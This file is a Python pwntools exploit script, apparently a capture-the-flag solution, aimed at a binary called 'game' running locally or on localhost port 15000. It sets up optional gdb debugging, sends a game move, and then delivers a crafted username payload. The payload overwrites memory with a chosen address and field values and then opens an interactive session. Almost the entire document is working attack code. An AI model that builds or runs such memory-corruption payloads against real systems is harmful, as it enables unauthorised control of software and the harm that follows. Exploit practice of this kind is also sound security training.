#
#	***************************
#	* Pwning exploit template *
#	* Arthor: Cobra           *
#	***************************
#

from pwn import *
import sys

local = 0
debug = 0

def conn():
	global local
	global debug

	for arg in sys.argv[1:]:
		if arg in ('-h', '--help'):
			print('Usage: python ' + sys.argv[0] + ' <option> ...')
			print('Option:')
			print('        -h, --help:     Show help')
			print('        -l, --local:    Running on local')
			print('        -d, --debug:    Use gdb auto attach')
			exit(0)
		if arg in ('-l', '--local'):
			local = 1
		if arg in ('-d', '--debug'):
			debug = 1

	if local:
		s = process('./game')
		if debug:
			gdb.attach(s, gdbscript='''
				b*0x403431
				c
				set $rip = 0x403433
				c
			''')
		else:
			raw_input('DEBUG')
	else:
		s = remote('localhost', 15000)

	return s

s = conn()

elf = ELF('game')

s.sendlineafter(b'2. Exit', b'1')

if debug:
	s.sendlineafter(b'Input move: ', b'D')
else:
	s.recvuntil(b'It is on beta version, sorry if sometime you cannot play T^T\n')
	log.info('Get map from server')
	for i in range(20):
		print(s.recvline().decode(), end='')
	move = input('Input move: ').strip()
	log.info('Send move: %s', move)
	s.sendlineafter(b'Input move: ', move.encode())

payload = b'My name is Cobra' + b'\x00' * 16 + p64(0) * 14 + p64(0x40C480) + p64(16) + p64(0) * 2 + p32(1) + p32(2000)
s.sendlineafter(b'Input your username: ', payload)

s.interactive()
